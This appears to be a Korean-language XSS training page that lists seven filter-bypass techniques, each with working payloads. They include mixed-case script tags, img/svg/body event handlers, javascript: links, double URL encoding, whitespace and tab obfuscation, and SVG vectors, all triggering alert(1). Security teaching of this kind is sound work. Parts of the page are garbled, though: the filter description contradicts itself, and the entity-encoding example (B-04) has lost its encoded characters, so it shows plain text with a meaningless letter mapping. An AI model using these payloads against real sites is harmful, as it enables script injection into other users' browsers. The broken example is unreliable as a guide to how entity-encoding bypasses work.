[실습] XSS 필터 우회 기법 (xss.md 4장)

⚠️ 이 페이지는 실제 필터 우회를 실습하는 학습용 앱입니다.

약한 필터 시뮬레이터

아래 필터는 소문자 <script> 태그만 제거합니다. 우회해보세요.

적용 중인 필터: input.replace(/<script>/gi, '')... 잠깐, 이건 대소문자 구분 없이 제거하네요.
실제 취약 필터: input.replace(/<script>/g, '') (소문자만)
결과가 여기 나옵니다

우회 기법 목록 (xss.md 4장)

B-01. 대소문자 혼합 (Case Variation)

방어 가정: 소문자 <script> 만 블랙리스트

<ScRiPt>alert(1)</sCrIpT>

→ 소문자 필터를 우회하지만 브라우저는 대소문자 무관하게 실행

B-02. 이벤트 핸들러 활용 (Event Handler)

방어 가정: <script> 태그만 제거, 이벤트 핸들러 무시

<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>

→ script 태그 없이도 JS 실행 가능

B-03. javascript: 프로토콜 (Protocol Handler)

방어 가정: href 필터 없음

<a href="javascript:alert(1)">클릭하면 실행</a>
<a href="javascript:void(0)" onclick="alert(1)">클릭</a>

직접 클릭해보세요:

클릭하면 alert 실행

B-04. HTML 엔티티 인코딩 (Entity Encoding)

방어 가정: 단순 문자열 매칭 필터 (alert 단어를 차단)

onerror=alert(1)
<!-- a = a, l = l, e = e, r = r, t = t -->

→ 브라우저는 HTML 엔티티를 디코딩 후 실행

B-05. URL / 이중 인코딩 (Double URL Encoding)

방어 가정: 서버가 1회 URL 디코딩 후 필터링, 2회 디코딩 후 출력

%253Cscript%253E  →  (1차 디코딩) %3Cscript%3E  →  (2차 디코딩) <script>
%3C = <  (일반 URL 인코딩)
%253C = %3C  (% 자체를 %25로 인코딩)

→ 1회 디코딩만 하는 서버의 필터를 우회

B-06. 태그 내 공백 제거 (Attribute Obfuscation)

방어 가정: 공백 기준으로 파싱하는 필터

<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>  <!-- 탭 문자 -->
<img %09 src=x onerror=alert(1)>

B-07. SVG 네임스페이스 활용 (SVG Vector)

HTML 파서와 SVG 파서의 차이를 이용

<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
